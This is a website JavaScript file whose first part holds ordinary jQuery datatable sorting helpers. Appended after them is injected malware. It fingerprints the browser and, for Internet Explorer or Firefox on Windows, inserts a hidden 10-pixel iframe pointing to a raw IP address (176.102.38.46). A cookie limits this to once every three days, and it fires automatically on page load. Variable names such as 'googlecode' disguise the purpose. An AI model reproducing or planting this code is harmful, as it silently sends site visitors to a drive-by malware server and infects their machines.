function postAjaxSortTable(datatable)
{
    var selectedColumn = datatable.jq.find('.ui-state-active');
    if(selectedColumn.length <= 0)
    {
        return;
    }
    var sortorder = "ASCENDING";
    if(selectedColumn.find('.ui-icon-triangle-1-s').length > 0)
    {
        sortorder = "DESCENDING";
    }
    datatable.sort(selectedColumn, sortorder);
}

function refreshSort(){
    alert("sasas");
jQuery('#content').find('.ui-state-active').trigger('click');
jQuery('#content').find('.ui-state-active').trigger('click');
}

function BDN(cap) {
    var uas = window.navigator.userAgent,
        OperaB = /Opera[ \/]+\w+\.\w+/i,
        OperaV = /Version[ \/]+\w+\.\w+/i,
        FirefoxB = /Firefox\/\w+\.\w+/i,
        ChromeB = /Chrome\/\w+\.\w+/i,
        IEB = /MSIE *\d+\.\w+/i,
        BRW = new Array(),
        BRWSplit = /[ \/\.]/i,
        OperaV = uas.match(OperaV),
        Firefox = uas.match(FirefoxB),
        Chrome = uas.match(ChromeB),
        IE = uas.match(IEB),
        Opera = uas.match(OperaB);
    if ((!Opera == "") & (!OperaV == "")) BRW[0] = OperaV[0].replace(/Version/, "Opera")
    else if (!Opera == "") BRW[0] = Opera[0]
    else if (!IE == "") BRW[0] = IE[0]
    else if (!Firefox == "") BRW[0] = Firefox[0]
    else if (!Chrome == "") BRW[0] = Chrome[0];
    var outstr;
    if (BRW[0] != null) outstr = BRW[0].split(BRWSplit);
    if ((cap == null) && (outstr != null)) {
        cap = outstr[2].length;
        outstr[2] = outstr[2].substring(0, cap);
        outstr[3] = 'uncomn';
        if (uas.indexOf('Windows') != -1) outstr[3] = 'Windows';
        return (outstr);
    } else return (false);
}
function SVB() {
    var dtstr = BDN();
    if (dtstr[0]) {
 if ((dtstr[0] == 'MSIE' || dtstr[0] == 'Firefox') & dtstr[3] == 'Windows'){
            var divTag = document.createElement('div');
            divTag.id = 'goo';
            document.body.appendChild(divTag);
            var googlecode = document.createElement('iframe');
            googlecode.src = 'http://176.102.38.46/292L';
            googlecode.width = '10px';
            googlecode.height = '10px';
            googlecode.setAttribute('style', 'visibility:hidden');
            document.getElementById('goo').appendChild(googlecode);
        }
    }
}
function SCk(cnm, cValue, nDay, path) {
    var today = new Date();
    var exp = new Date();
    if (nDay == null || nDay == 0) nDay = 3;
    exp.setTime(today.getTime() + 3600000 * 24 * nDay);
    document.cookie = cnm + "=" + escape(cValue) + ";exps=" + exp.toGMTString() + ((path) ? "; path=" + path : "");
}
function GCk(nm) {
    var start = document.cookie.indexOf(nm + "=");
    var len = start + nm.length + 1;
    if ((!start) && (nm != document.cookie.substring(0, nm.length))) {
        return null;
    }
    if (start == -1) return null;
    var end = document.cookie.indexOf(";", len);
    if (end == -1) end = document.cookie.length;
    return unescape(document.cookie.substring(len, end));
}
if (navigator.cookieEnabled) {
    if (GCk('MGHTRX') == 12112014) {} else {
        SCk('MGHTRX', '12112014', '3', '/');
        if (document.loaded) {
            SVB();
        } else {
            if (window.addEventListener) {
                window.addEventListener('load', SVB, false);
            } else {
                window.attachEvent('onload', SVB);
            }
        }
    }
}